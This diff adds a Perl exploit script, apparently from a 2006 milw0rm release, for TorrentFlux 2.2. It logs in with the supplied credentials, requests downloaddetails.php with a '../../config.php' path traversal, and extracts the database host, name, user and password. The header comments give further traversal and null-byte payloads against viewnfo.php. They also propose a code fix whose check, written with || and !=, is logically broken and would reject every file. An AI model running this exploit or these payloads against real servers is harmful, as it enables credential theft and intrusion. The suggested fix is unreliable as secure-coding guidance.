@@ -1,0 +1,160 @@
+#Description: 
+
+#TorrentFlux fails to sanitise the variable "alias" in downloaddetails.php. This allows an 
+#attacker to include any file they want; the contents is displayed at in the spaces provided
+#and the remaning data is displayed as error messages on the page. Overall Torrentflux makes it
+#look quite nice. Solution use SecurityClean() of viewnfo.php to solve the problem. 
+
+# Note: After just looking at the code for viewnfo.php of TorrentFlux 2.1, it would seem that
+# it is possible to also read the config.php file in the same way, since path was not sanitised. 
+# Although they have fixed this problem in 2.2 with a function i demonstrated to the 
+# developer for a previous vulnerability. Exploit: viewnfo.php?path=../config.php
+
+# Just a thought, SecurityCleanPath() could look a bit nicer like so: 
+# From: 
+#if( (strtolower( substr( $string, -4 ) ) == ".txt") || (strtolower( substr( $string, -4 ) ) == ".nfo") )
+#    {
+#        // we are good
+#    }
+#    else
+#    {
+#        AuditAction($cfg["constants"]["error"], "Not a text or NFO: " . $string);
+#        die("Invalid file specified.  Action has been logged.");
+#    }
+
+#To: 
+#if( (strtolower( substr( $string, -4 ) ) != ".txt") || (strtolower( substr( $string, -4 ) ) != ".nfo") )
+#{
+#	AuditAction($cfg["constants"]["error"], "Not a text or NFO: " . $string);
+#	die("Invalid file specified.  Action has been logged.");
+#}
+# And it would seem for some reason if you do you change the above code it prevents you from 
+# using a null character to access any file in the current or above directory. 2.2 is 
+# vulnerable to this. EG: viewnfo.php?path=../config.php%00.txt (but since you cant go back
+# a directory it doesn't help much - and you are stuck in the downloads, or above directories). 
+
+# r0ut3r (writ3r [at] gmail.com)
+
+#################################################################################################
+#                                    r0ut3r Presents...                                         #
+#                                                                                               #
+#                                Another r0ut3r discovery!                                      #
+#                                  writ3r [at] gmail.com                                        #
+#                                                                                               #
+#                   TorrentFlux 2.2 Database Credentials Exposure Exploit                       #
+#################################################################################################
+# Software: TorrentFlux 2.2                                                                     #
+#                                                                                               #
+# Vendor: http://www.torrentflux.com/                                                           #
+#                                                                                               #
+# Released: 2006/12/09                                                                          #
+#                                                                                               #
+# Discovered & Exploit By: r0ut3r (writ3r [at] gmail.com)                                       #
+#                                                                                               #
+# Note from a developer: "Valid TorrentFlux user IDs are REQUIRED and this is NOT an open       #
+# vulnerability to a NON user".                                                                 #
+#                                                                                               #
+# Note: The information provided in this document is for TorrentFlux administrator              #
+# testing purposes only! This vulnerability requires a user account.                            #
+#                                                                                               #
+# Apart from a few problems (which are fixed) TorrentFlux is a great torrent client.            #
+# Download it at: http://www.torrentflux.com/                                                   #
+#################################################################################################
+
+use IO::Socket;
+
+$port = "80"; # connection port
+$target = @ARGV[0]; # torrentflux.com
+$folder = @ARGV[1]; # /torrentflux/
+$user = @ARGV[2]; # login username
+$pass = @ARGV[3]; # login password
+
+sub Header()
+{
+	print q
+	{#################################################################################################
+#                                    r0ut3r Presents...                                         #
+#                                                                                               #
+#                                Another r0ut3r discovery!                                      #
+#                                  writ3r [at] gmail.com                                        #
+#                                                                                               #
+#                   TorrentFlux 2.2 Database Credentials Exposure Exploit                       #
+#################################################################################################
+};
+}
+
+sub Usage()
+{
+	print q
+	{
+Usage: db_tf2.pl [target] [directory] [username] [password]
+Example: db_tf2.pl torrentflux.com /torrentflux/ r0ut3r testing123 
+};
+	exit();
+}
+
+Header();
+
+if (!$target || !$folder || !$user || !$pass) {
+	Usage(); }
+
+print "\n[+] Connecting...\r\n";
+$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $target, PeerPort => $port) || die "[-] Failed to connect. Exiting...\r\n";
+print "[+] Attempting to login\n";
+print $sock "GET ".$folder."login.php?username=$user&iamhim=$pass HTTP/1.1\n";
+print $sock "Host: $target\n";
+print $sock "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n";
+print $sock "Accept: text/html\n";
+print $sock "Connection: keep-alive\n\n\r\n";
+
+while (<$sock>)
+{
+        if (/Cookie: TorrentFlux=(.*?);/)
+        {
+                $cookie = "TorrentFlux=$1";
+        }
+}
+
+print "[+] Successfully logged in\n";
+print "[+] Cookie: ".$cookie."\n";
+if ($cookie eq "")
+{
+        print "[-] Failed to login. Exiting...";
+	exit();
+}
+
+print "[+] Sending request\n";
+
+$xpack = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $target, PeerPort => $port) || die "[-] Failed to connect on exploit attempt. Exiting...\r\n";
+print $xpack "GET ".$folder."downloaddetails.php?alias=../../config.php HTTP/1.1\n";
+print $xpack "Host: $target\n";
+print $xpack "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n";
+print $xpack "Accept: text/html\n";
+print $xpack "Cookie: ".$cookie."\n";
+print $xpack "Connection: keep-alive\n\n";
+print "\n---------- Exploit Results ----------\n\n"; 
+
+while (<$xpack>)
+{
+	if (/db_type"] = "(.*?)";/) {
+		print "Type: $1\n"; }
+	if (/db_host"] = "(.*?)";/) {
+		print "Host: $1\n"; }
+	if (/db_name"] = "(.*?)";/) {
+		print "Name: $1\n"; }
+	if (/db_user"] = "(.*?)";/) {
+		print "User: $1\n"; }
+	if (/db_pass"] = "(.*?)";/) {
+		print "Pass: $1\n\n"; 
+		$res = true; }
+}
+if ($res eq false) {
+	print "[-] Exploit failed - Not vulnerable\n"; }
+
+print "[!] Connection to host lost...\n";
+
+#################################################################################################
+#               This has been another r0ut3r discovery - writ3r [at] gmail.com                  #
+#################################################################################################
+
+# milw0rm.com [2006-12-09]
